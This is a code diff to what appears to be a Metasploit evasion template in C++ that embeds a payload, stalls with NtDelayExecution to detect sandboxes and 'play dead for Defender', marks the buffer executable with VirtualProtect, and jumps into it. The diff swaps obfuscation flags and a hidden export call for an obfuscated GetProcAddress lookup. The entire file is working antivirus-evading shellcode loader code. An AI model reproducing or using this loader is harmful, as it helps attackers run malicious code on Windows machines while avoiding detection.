@@ -1,16 +1,5 @@
-#include <stdio.h>
+#include <iostream>
 #include <windows.h>
-
-#define VIRT         1 
-
-#define CFLOW_V2     1 
-#define FAKE_SIGNS   1  
-#define ANTIDEBUG_V2 1 
-
-#define NO_OBF       0 
-#define NO_CFLOW     0 
-#define NO_ANTIDEBUG 0 
-
 
 #include "<%= File.join(Msf::Config.data_directory, 'headers', 'windows', 'obfusheader.h') %>"
 
@@ -21,7 +10,7 @@ typedef NTSTATUS (__stdcall *fnNtDelayExecution)(
 
 #define SCSIZE <%= payload_length %>
 
-char bPayload[SCSIZE] = "<%= payload %>";
+char bPayload[] = "<%= payload %>";
 
 int PlayDeadForDefender()
 {
@@ -30,16 +19,22 @@ int PlayDeadForDefender()
 	  LARGE_INTEGER       DelayInterval         = { 0 }; 
 	  LONGLONG            Delay                 = 0; 
     NTSTATUS            STATUS                = 0;
-        DWORD               _T0                   = 0, 
-        _T1                   = 0;
+    DWORD               _T0                   = 0, 
+                        _T1                   = 0;
         
     Delay = dwMilliSeconds * 10000;
-	DelayInterval.QuadPart = - Delay;
+	  DelayInterval.QuadPart = - Delay;
 
+    fnNtDelayExecution fncNtDelayExecution = (fnNtDelayExecution)GetProcAddress(LoadLibrary(OBF("ntdll.dll")),OBF("NtDelayExecution"));
+    
     _T0 = GetTickCount();
+    
+    STATUS = fncNtDelayExecution(FALSE, &DelayInterval);
 
-    CALL_EXPORT(HIDE_STRING("ntdll.dll"), HIDE_STRING("NtDelayExecution"), NTSTATUS(*)(BOOLEAN, PLARGE_INTEGER), FALSE, &DelayInterval);
-
+    if (STATUS != 0) {
+      return 0;
+    }
+    
     _T1 = GetTickCount();
 
     if (_T1 - _T0 < dwMilliSeconds) {
@@ -49,19 +44,22 @@ int PlayDeadForDefender()
     return 1;
 }
 
-void main() {
+int main() {
+
     DWORD dwOldProtect;
     char* payload_fnc = NULL;
 
     payload_fnc = bPayload;
+    
     VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+
     if(!PlayDeadForDefender())
     {
-      return ;
+      return 1;
     }
 	
     (*(void (*)()) payload_fnc)();
 
-	  return ;
+	  return 0;
 }
 
